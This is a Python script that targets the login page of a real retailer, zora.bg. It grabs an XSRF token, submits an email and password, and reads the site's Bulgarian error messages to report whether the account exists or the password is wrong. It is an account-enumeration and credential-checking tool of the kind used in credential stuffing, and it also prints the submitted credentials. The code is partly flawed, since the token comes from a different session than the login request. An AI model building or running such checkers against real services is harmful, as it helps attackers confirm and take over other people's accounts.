import requests
from bs4 import BeautifulSoup
import json

def get_xsrf_token(url):
    session = requests.Session()
    response = session.get(url)
    
    # The first if loop is the
    # working xsrf grabber
    if response.status_code == 200:
        xsrf_token = session.cookies.get('XSRF-TOKEN')
        if xsrf_token:
            print("XSRF token found in cookies.")
            print(f"XSRF Token: {xsrf_token}")
            return xsrf_token 
        
        soup = BeautifulSoup(response.text, 'html.parser')
        xsrf_token = soup.find('meta', {'name': 'csrf-token'}) or soup.find('input', {'name': '_token'})
        
        if xsrf_token:
            token_value = xsrf_token.get('content') if xsrf_token.has_attr('content') else xsrf_token.get('value')
            if token_value:
                print("XSRF token found in page content.")
                print(f"Token Value: {token_value}")
                return token_value
        print("XSRF token not found.")
        return None
    else:
        print(f"Failed to retrieve the page. Status code: {response.status_code}")
        return None

def check_user_zora(email, password):
    url = "https://zora.bg/auth/login"
    
    xsrf_token = get_xsrf_token("https://zora.bg/auth/login")
    
    if not xsrf_token:
        print(f"Second xsrf token: {xsrf_token}")
        return "request_error"
    
    session = requests.Session()
    
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/json; charset=UTF-8", 
        "x-requested-with": "XMLHttpRequest",
        "x-xsrf-token": xsrf_token, 
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "referer": "https://zora.bg/auth/login",
    }
    
    data = {
        "email": email,
        "password": password,
        "_token": xsrf_token, 
    }
    
    print("Sending data:", json.dumps(data, ensure_ascii=False))
    
    response = session.post(url, headers=headers, json=data) 
    
    print("Response Status Code:", response.status_code)
    print("Response Text:", response.text)
    
    if response.status_code == 200:
        if "Не съществува клиент с такъв имейл" in response.text:
            return "user_does_not_exist"
        elif "Грешна парола" in response.text:
            return "user_exists"
        else:
            return "request_error"
    elif response.status_code == 500:
        return "request_error"
    else:
        return "request_error"

email = ""
password = ""
status = check_user_zora(email, password)
print(status)
